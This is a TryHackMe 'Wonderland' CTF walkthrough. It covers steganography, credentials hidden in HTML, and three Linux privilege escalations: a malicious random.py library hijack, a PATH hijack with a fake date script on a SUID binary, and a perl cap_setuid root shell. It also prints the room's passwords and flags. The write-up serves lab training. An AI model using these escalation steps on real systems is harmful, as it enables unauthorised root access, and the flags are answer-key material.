# 🐇 Wonderland — TryHackMe Write-Up

> *"Curiouser and curiouser!"*  
> **Difficulty:** Medium | **Platform:** TryHackMe | **Date:** March 2026

---

## 📋 Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration & Steganography](#2-web-enumeration--steganography)
3. [Initial Access — SSH as Alice](#3-initial-access--ssh-as-alice)
4. [PrivEsc #1 — Python Library Hijacking → Rabbit](#4-privesc-1--python-library-hijacking--rabbit)
5. [PrivEsc #2 — PATH Hijacking → Hatter](#5-privesc-2--path-hijacking--hatter)
6. [PrivEsc #3 — Perl Capabilities → Root](#6-privesc-3--perl-capabilities--root)
7. [Flags](#7-flags)
8. [Summary](#8-summary)

---

## 1. Reconnaissance

```bash
sudo nmap -sCV -O -Pn 10.128.182.231 -oA nmap-result
```

### Results

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH (OpenSSH 7.6p1) | For later access |
| 80   | HTTP (Golang net/http) | Title: **"Follow the white rabbit."** |

Only two ports — clean attack surface.

---

## 2. Web Enumeration & Steganography

### Following the Hint

The page title "Follow the white rabbit" along with the hint extracted later pointed to a hidden directory path.

Navigated to `http://<TARGET_IP>/r/a/b/b/i/t` — found a page with **hidden credentials** in the HTML source:

```html
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

### Steganography on the Homepage Image

Downloaded the rabbit image from the homepage:

```bash
wget http://<TARGET_IP>/img/white_rabbit_1.jpg
steghide extract -sf white_rabbit_1.jpg
# Passphrase: (empty)
```

Extracted `hint.txt`:
```
follow the r a b b i t
```

This confirmed the `/r/a/b/b/i/t` directory path.

---

## 3. Initial Access — SSH as Alice

Used the credentials found in the hidden HTML:

```bash
ssh alice@<TARGET_IP>
# Password: HowDothTheLittleCrocodileImproveHisShiningTail
```

### Interesting Discovery

```bash
ls -la /home/alice/
```

```
-rw------- 1 root  root    66 May 25  2020 root.txt        # owned by root!
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```

> **Note:** In this room, everything is "upside down" — `root.txt` is in Alice's home, and `user.txt` is in `/root/`.

### User Flag

```bash
cat /root/user.txt
# thm{"Curiouser and curiouser!"}
```

---

## 4. PrivEsc #1 — Python Library Hijacking → Rabbit

### Sudo Enumeration

```bash
sudo -l
# (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Alice can run the script **as rabbit**. The script imports the `random` module:

```python
import random
# ...
line = random.choice(poem.split("\n"))
```

### The Attack — Python Library Hijacking

Python searches for modules in the **current directory first** before system paths. By creating a malicious `random.py` in `/home/alice/`, Python will import it instead of the real `random` module.

```bash
# Create malicious random.py
nano /home/alice/random.py
```

```python
import os
os.system("/bin/bash")
```

```bash
# Run the script as rabbit
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

**Result:** Shell as `rabbit` ✅

---

## 5. PrivEsc #2 — PATH Hijacking → Hatter

### Discovery

Found a SUID binary in rabbit's home:

```bash
ls -la /home/rabbit/
# -rwsr-sr-x 1 root root 16816 May 25 2020 teaParty
```

Running it revealed it calls the `date` command internally — without a full path (`/bin/date`).

### The Attack — PATH Hijacking

When a binary calls a command without its full path, the OS searches through the `$PATH` variable in order. By prepending a controlled directory to `$PATH` and placing a malicious `date` script there, we can hijack the execution.

```bash
# Create malicious date binary
echo '/bin/bash' > /tmp/date
chmod +x /tmp/date

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run the SUID binary
./teaParty
```

**Result:** Shell as `hatter` ✅

### Hatter's Password

```bash
cat /home/hatter/password.txt
# WhyIsARavenLikeAWritingDesk?
```

---

## 6. PrivEsc #3 — Perl Capabilities → Root

### Discovery

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.26.1 = cap_setuid+ep
```

`cap_setuid` allows a binary to change its UID — meaning Perl can set UID to 0 (root) without needing sudo!

> **Note:** This exploit requires a proper login shell. Used SSH with hatter's password to get a clean session first.

```bash
ssh hatter@<TARGET_IP>
# Password: WhyIsARavenLikeAWritingDesk?
```

### The Attack — Perl cap_setuid

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**Result:** Root shell ✅

### Root Flag

```bash
cat /home/alice/root.txt
# thm{Twinkle, twinkle, little bat! How I wonder what you're at!}
```

---

## 7. Flags

| Flag | Value |
|------|-------|
| 👤 User Flag | `thm{"Curiouser and curiouser!"}` |
| 🏆 Root Flag | `thm{Twinkle, twinkle, little bat! How I wonder what you're at!}` |

---

## 8. Summary

### Attack Chain

```
Nmap → Port 80 (HTTP)
    │
    ├─► steghide on homepage image → hint.txt → "follow the r a b b i t"
    │
    ├─► /r/a/b/b/i/t → Hidden HTML credentials → alice:HowDothThe...
    │
    └─► SSH as alice
            │
            ├─► sudo -l → python3.6 walrus_and_the_carpenter.py (as rabbit)
            │       └─► Python Library Hijacking (random.py) → rabbit
            │
            ├─► SUID binary teaParty → calls `date` without full path
            │       └─► PATH Hijacking (/tmp/date) → hatter
            │
            └─► getcap → perl cap_setuid+ep
                    └─► POSIX::setuid(0) → ROOT 🏆
```

### Techniques Used

| Technique | Tool/Command | Context |
|-----------|-------------|---------|
| Steganography | `steghide` | Extracting hint from image |
| Python Library Hijacking | Custom `random.py` | PrivEsc alice → rabbit |
| PATH Hijacking | Custom `date` in `/tmp` | PrivEsc rabbit → hatter |
| Linux Capabilities Abuse | `perl cap_setuid` | PrivEsc hatter → root |

### Lessons Learned

- **"Follow the hint"** — room names and page titles are always meaningful in CTFs.
- **Hidden HTML elements** (`display: none`) often contain sensitive data — always check the page source.
- **Python Library Hijacking**: Python resolves imports from the current directory first. If you control the CWD, you can hijack any `import`.
- **PATH Hijacking**: SUID binaries that call commands without full paths are vulnerable. Always prepend a controlled directory to `$PATH`.
- **Linux Capabilities** (`getcap`) are often overlooked but extremely powerful — always enumerate them before giving up on PrivEsc.
- **"Upside down"** rooms flip the expected flag locations — read hints carefully!

---

*Write-up by [XENOS](https://obadahamed.github.io) | Part of the 52-Week Red Team Roadmap*
